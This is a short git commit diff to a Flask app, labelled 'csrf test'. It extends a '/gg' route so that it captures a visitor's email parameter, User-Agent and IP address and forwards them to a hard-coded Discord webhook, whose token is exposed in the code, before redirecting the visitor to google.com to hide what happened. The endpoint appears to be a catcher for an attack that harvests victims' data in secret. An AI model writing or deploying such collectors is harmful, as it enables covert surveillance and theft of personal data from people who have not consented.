9969fc4ead332ff8d1bede43d45bb208c19977e4
nitro <tsganbold13@gmail.com>
2024-10-03 13:58:48 +0800

    csrf test

--- app.py
+++ app.py
@@ -16,8 +16,10 @@ def hello_world():
 @app.route('/gg')
 def idk_wtf():
     param = request.args.get('mail')
+    useragent = request.headers.get('User-Agent')
+    src_ip = request.remote_addr
     discord = Discord(url="https://discord.com/api/webhooks/1217552500605849671/yzRXq3s_o4d424amxpcuqUgvNbQAkFiH-nYqfcFF--jxovQ1hdNtXv6j7BgtUbG7PwOf")
-    discord.post(content=param)
+    discord.post(content=f'Mail: {param}, User-Agent: {useragent}, IP: {src_ip}')
     return redirect('https://google.com')
 
 # Run the Flask application
